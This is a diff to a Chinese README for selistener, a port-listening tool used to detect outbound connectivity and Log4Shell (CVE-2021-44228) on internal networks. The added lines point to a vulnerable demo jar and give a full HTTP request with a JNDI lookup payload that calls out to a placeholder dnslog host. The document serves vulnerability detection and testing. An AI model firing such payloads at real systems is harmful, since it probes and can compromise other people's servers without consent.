@@ -1,5 +1,18 @@
 ### 参考项目 https://github.com/fuzz7j/JNDIServer
 ### 搭配log4j2burpscanner参考[这里](https://github.com/f0ng/selistener/blob/master/FAQ.md#%E8%81%94%E5%8A%A8log4j2burpscanner)
+
+项目中的[jar包](https://github.com/f0ng/selistener/blob/master/Log4_demo-0.0.1-SNAPSHOT.jar)为log4j(CVE-2021-44228)环境
+触发漏洞的请求包为:
+```bash
+GET /cvetext?cmd=$%7bjndi:dns://xxxxx.dnslog.cn%7d HTTP/1.1
+Host: 127.0.0.1:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+```
+
 # selistener
 
 用于解决判断出网情况的问题，以http、ldap、rmi以及socket形式批量监听端口，在web界面进行结果查看，结果呈现形式类似dnslog，可用于内网log4j(CVE-2021-44228)等漏洞的检测，默认访问`http://x.x.x.x:65535/resp`即可查看到请求
